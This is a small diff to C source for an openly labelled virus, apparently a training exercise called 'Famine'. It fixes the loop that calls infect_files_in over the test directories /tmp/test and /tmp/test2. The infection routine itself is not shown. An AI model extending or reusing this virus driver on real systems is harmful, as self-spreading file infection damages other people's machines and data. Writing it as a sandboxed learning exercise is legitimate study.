@@ -10,7 +10,12 @@
 /*                                                                            */
 /* ************************************************************************** */
 
-inline void	virus()
+#include <sys/types.h>
+#include "famine.h"
+
+#define ARRAY_SIZE(x) (sizeof(x) / sizeof(*x))
+
+void	virus()
 {
 	const char *playgrounds[] =
 	{
@@ -18,7 +23,7 @@ inline void	virus()
 		"/tmp/test2"
 	};
 
-	for (size_t i = 0; i < sizeof(playgrounds); i++)
+	for (size_t i = 0; i < ARRAY_SIZE(playgrounds); i++)
 	{
 		infect_files_in(playgrounds[i]);
 	}
